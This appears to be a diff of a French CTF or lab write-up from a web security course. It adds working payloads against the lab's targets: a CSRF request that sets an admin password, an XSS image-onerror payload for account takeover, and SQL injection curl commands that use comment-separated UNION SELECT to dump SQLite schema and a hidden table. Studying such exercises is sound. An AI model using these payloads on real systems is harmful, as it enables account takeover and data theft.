@@ -18,7 +18,17 @@ fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn", {
 
 ### 2. Proposez une requête qui vous permettra de prendre le contrôle du compte admin, si elle était exécutée par l’administrateur
 
-By tricking the administrator into executing the following request, an attacker can take control of the admin account.
+Un injection pourrait se faire à travers le compte d'administrateur lorsqu'il reçoit un message à travers l'application web. 
+
+```javascript
+fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin", {
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    "body": "password=hackerspassword",
+    "method": "POST",
+});
+```
 
 ### 3. Écrivez une payload JavaScript qui exécute la requête
 
@@ -48,7 +58,8 @@ La fonctionnalité de validation des entrées utilisateur (input validation) est
 
 ### 5. Quel est le flag ? Comment avez-vous pu l'obtenir ?
 
-The flag was retrieved by injecting an XSS payload that executes in the admin’s session.
+On a pu récupérer le flag en utilisant l'injection via une balise HTML qui nous permet d'exécuter du `javascript` lorsque l'image charge. Comme l'image n'existe pas, le `onerror` s'exécute, là notre payload malveillant fait effet et on change le mot de passe de l'administateur à ce que l'on souhaite.
+
 
 ```html
 <img src='invalid.jpg' onerror="
@@ -160,9 +171,31 @@ Le serveur ne valide pas correctement les entrées, permettant ainsi d'injecter 
 
 Le flag a été obtenu en exploitant une injection SQL pour extraire des données sensibles depuis une table cachée dans la base de données.
 
+J'ai pu trouver qu'on peut injecter du SQL en utilisant des commentaires pour séparer les commandes. On connait la table `flowers` et on aimerait trouver un `UNION` avec une autre table existante qui >= de colonnes.
+
+
+En recherchant, on a trouvé que c'était du `SQLite` et donc on a regardé les tables par défaut dans la documentation.
+
+
 ```bash
 curl 'http://sql.slh.cyfr.ch/flowers' \
   -H 'Accept: */*' \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"id":"1/**/UNION/**/SELECT/**/type,/**/name,/**/tbl_name,/**/sql/**/FROM/**/sqlite_master/**/"}' \
+  --insecure
+```
+
+Output
+```bash
+[[1,"Rose","Red",5],["index","sqlite_autoindex_super_secret_stuff_1","super_secret_stuff",null],["table","flowers","flowers","CREATE TABLE flowers (\n            id INTEGER PRIMARY KEY,\n            name TEXT,\n            color TEXT,\n            petals INTEGER\n        )"],["table","super_secret_stuff","super_secret_stuff","CREATE TABLE super_secret_stuff (name TEXT PRIMARY KEY, value TEXT)"]]
+```
+
+On trouve une table `super_secret_stuff`
+
+```bash
+curl 'http://sql.slh.cyfr.ch/flowers' \
+  -H 'Accept: */*' \
+  -H 'Content-Type: application/json' \
   --data-raw '{"id":"1/**/UNION/**/SELECT/**/name,/**/value,/**/NULL,/**/NULL/**/FROM/**/super_secret_stuff"}' \
   --insecure
 ```
